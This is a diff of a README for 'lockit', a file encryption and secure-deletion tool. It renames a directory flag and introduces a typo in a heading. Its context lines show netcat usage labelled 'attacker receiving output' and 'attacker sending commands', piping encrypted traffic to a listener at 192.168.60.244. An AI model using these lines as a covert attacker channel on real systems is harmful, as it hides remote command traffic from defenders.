@@ -9,7 +9,7 @@ Lock it, unlock it.
 ./lockit encrypt <file> -p                 # Encrypt a file with a custom passphrase.
 ./lockit encrypt <dir>                     # Encrypt all files in a directory
 ./lockit decrypt <dir/file>                # Decrypt a file or directory
-./lockit encrypt <dir> --dir               # Compress, tar, and encrypt entire directories
+./lockit encrypt <dir> --zipdir            # Compress, tar, and encrypt entire directories
 ./lockit remove/delete/rm/del <dir/file>   # Securely delete a file / directory.
 ./lockit remove <file> <file2> --skip-dod  # Skip DoD overwrite passes.
 ./lockit encrypt --pipe                    # Process as pipe.
@@ -45,7 +45,7 @@ nc -lvnp 9998 | ./lockit decrypt --pipe # attacker receiving output
 ./lockit encrypt --pipe | nc 192.168.60.244 9999 # attacker sending commands
 ```
 
-## Mechanism
+## Mechanismg
 - Lockit compresses files using zstd and secures them with AES-256-GCM encryption.
 - Lockit provides secure file deletion that follows DoD 5220.22-M standard.
 
